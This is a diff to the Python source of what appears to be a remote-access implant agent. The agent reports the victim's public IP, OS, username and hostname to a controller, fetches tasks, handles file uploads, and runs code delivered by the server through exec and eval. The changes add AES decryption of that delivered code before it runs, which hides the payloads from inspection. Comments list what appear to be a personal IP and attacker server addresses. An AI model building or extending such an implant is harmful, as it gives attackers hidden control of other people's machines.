@@ -36,7 +36,7 @@ delegates_UUID = []
 delegates_aswers = []
 result = {}
 
-# my ip 87.3.200.118
+# my ip 87.3.195.225
 # linode 194.195.242.157
 # linode 172.104.135.23
 # linode 172.104.135.67
@@ -86,6 +86,14 @@ def encrypt_AES256(data, key=Agent.encryption_key):
     h.update(iv + ciphertext)
     return iv + ciphertext + h.digest()
 
+def encrypt_code(data, key=Agent.encryption_key):
+    key = base64.b64decode(key)
+    data = data.encode()
+    iv = get_random_bytes(16)  # generate a new random IV
+    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
+    ciphertext = cipher.encrypt(pad(data, 16))
+    return iv + ciphertext
+
 def decrypt_AES256(data, key=Agent.encryption_key):
     key = base64.b64decode(key)
     # Decode and remove UUID from the message first
@@ -102,6 +110,15 @@ def decrypt_AES256(data, key=Agent.encryption_key):
     # now to remove any padding that was added on to make it the right block size of 16
     decrypted_message = unpad(decrypted_message, 16)
     return json.loads(decrypted_message)
+
+def decrypt_code(data, key=Agent.encryption_key):
+    key = base64.b64decode(key)
+    iv = data[:16]  # 16 Bytes for IV at the beginning
+    message = data[16:]  # the rest is the message
+    decryption_cipher = AES.new(key, AES.MODE_CBC, iv=iv)
+    decrypted_message = decryption_cipher.decrypt(message)
+    decrypted_message = unpad(decrypted_message, 16)
+    return decrypted_message
    
 
 def to64(data):
@@ -120,6 +137,9 @@ def getIP():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
     return s.getsockname()[0]
+
+def getPublicIP():
+    return requests.get('https://api.ipify.org').text
 
 def send(response, uuid):
 
@@ -144,7 +164,7 @@ def checkin(agent):
 
     checkin_data = {    
         "action": "checkin",
-        "ip": getIP(),
+        "ip": getPublicIP(),
         "os": platform.system() + " " + platform.release(),
         "user": getpass.getuser(),
         "host": socket.gethostname(),
@@ -174,7 +194,8 @@ def get_tasks():
     if task_list:
         if task_list["tasks"]:
             print("[+] New Tasks")
-            print("\t" + str(task_list))
+            for i, t in enumerate(task_list["tasks"]):
+                print("\t{}) {}: {}".format(i,t["command"], t["parameters"]))
     
     
     if "delegates" in task_list:
@@ -197,6 +218,7 @@ def reverse_upload(task_id, file_id):
     }
 
     res = send(upload, agent.UUID)
+    res = res['chunk_data']
 
     response_bytes = res.encode('utf-8')
     response_decode = base64.b64decode(response_bytes)
@@ -280,7 +302,10 @@ def execute(task):
         
         if item == function:
             try:
-                exec(dynfs[item])
+                if agent.encryption_key == "":
+                    exec(dynfs[item])
+                else:
+                    exec(decrypt_code(dynfs[item]))
                 eval(function + "(" + str(param_list) + ")")
                 found = True
             except Exception as e:
@@ -338,11 +363,11 @@ else:
     # f.write(agent.UUID)
     # f.close()
 
-    ip = requests.get('https://api.ipify.org').text
-    print(ip)
-    if ip == "194.195.242.157" or ip == "172.104.135.23" or ip == "172.104.135.67":
-        print("[+] P2P Server")
-        p2p_server(1)
+
+    # ip = getPublicIP()
+    # if ip == "194.195.242.157" or ip == "172.104.135.23" or ip == "172.104.135.67":
+    #     print("[+] P2P Server")
+    #     p2p_server(1)
 
 while True:
 
